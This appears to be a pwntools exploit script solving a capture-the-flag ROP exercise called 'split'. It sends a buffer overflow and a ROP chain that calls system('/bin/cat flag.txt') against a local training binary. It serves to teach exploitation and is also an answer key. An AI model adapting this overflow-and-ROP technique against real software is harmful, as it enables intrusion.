#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./split')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./split', gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process('./split')
r = start()
#========= exploit here ===================
pop_rdi = 0x4007c3
payload = [
        b"A"*40,
        p64(pop_rdi),
        p64(0x601060), # /bin/cat flag.txt 
        p64(0x4006e7), #main return
        p64(0x400560)# system
        ]

r.recvuntil(">")
r.sendline(b"".join(payload))


#========= interactive ====================
r.interactive()
